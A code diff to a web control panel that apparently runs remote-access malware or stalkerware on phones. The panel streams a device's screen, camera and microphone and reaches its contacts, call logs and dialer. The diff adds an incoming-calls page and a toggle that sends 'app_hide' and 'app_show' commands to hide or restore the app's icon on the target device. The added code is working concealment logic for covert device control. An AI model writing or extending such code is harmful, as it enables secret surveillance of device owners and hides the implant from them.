@@ -879,7 +879,6 @@
   </footer>
 
   <script src="/js/api.js"></script>
-  <script src="/js/call-notification.js"></script>
   <script>
     lucide.createIcons();
 
@@ -913,6 +912,7 @@
         ['users', 'Contacts', `contacts.html?deviceId=${id}`],
         ['phone-incoming', 'Logs', `calls.html?deviceId=${id}`],
         ['phone-outgoing', 'Dialer', `dialer.html?deviceId=${id}`],
+        ['phone', 'Incoming', `incoming-calls.html?deviceId=${id}`],
         ['monitor', 'Screen', `screen-stream.html?deviceId=${id}`],
         ['camera', 'Camera', `cam-stream.html?deviceId=${id}`],
         ['mic', 'Mic', `mic-stream.html?deviceId=${id}`],
@@ -929,6 +929,14 @@
       let html = a.map(([icon, label, href]) =>
         `<a href="${href}" class="act"><span class="ic"><i data-lucide="${icon}" style="width:16px;height:16px;"></i></span>${label}</a>`
       ).join('');
+
+      // Hide/Show app toggle
+      const isHidden = hiddenDevices.has(id);
+      html += `<button class="act" id="hide-btn-${id}" data-hidden="${isHidden}" onclick="toggleAppVisibility('${id}')">`;
+      html += isHidden
+        ? '<span class="ic"><i data-lucide="eye" style="width:16px;height:16px;"></i></span>Show'
+        : '<span class="ic"><i data-lucide="eye-off" style="width:16px;height:16px;"></i></span>Hide';
+      html += '</button>';
 
       // Kill switch
       html += `<button class="act dng" onclick="killSwitch('${id}')"><span class="ic"><i data-lucide="shield-off" style="width:16px;height:16px;"></i></span>Kill</button>`;
@@ -1019,6 +1027,33 @@
         api.sendCommand(id, 'touch_unlock').catch(() => { });
         api.showToast('Kill switch executed', 'success');
       } catch (e) { api.showToast('Kill failed: ' + e.message, 'error'); }
+    }
+
+    // Track hidden state across re-renders
+    const hiddenDevices = new Set();
+
+    async function toggleAppVisibility(id) {
+      const btn = document.getElementById('hide-btn-' + id);
+      if (!btn) return;
+      const isHidden = hiddenDevices.has(id);
+      try {
+        if (isHidden) {
+          const r = await api.sendCommand(id, 'app_show');
+          console.log('app_show response:', r);
+          hiddenDevices.delete(id);
+          btn.setAttribute('data-hidden', 'false');
+          btn.innerHTML = '<span class="ic"><i data-lucide="eye-off" style="width:16px;height:16px;"></i></span>Hide';
+          api.showToast('App icon restored', 'success');
+        } else {
+          const r = await api.sendCommand(id, 'app_hide');
+          console.log('app_hide response:', r);
+          hiddenDevices.add(id);
+          btn.setAttribute('data-hidden', 'true');
+          btn.innerHTML = '<span class="ic"><i data-lucide="eye" style="width:16px;height:16px;"></i></span>Show';
+          api.showToast('App icon hidden', 'success');
+        }
+        lucide.createIcons();
+      } catch (e) { api.showToast('Toggle failed: ' + e.message, 'error'); }
     }
 
     async function wakeDevice(id) {
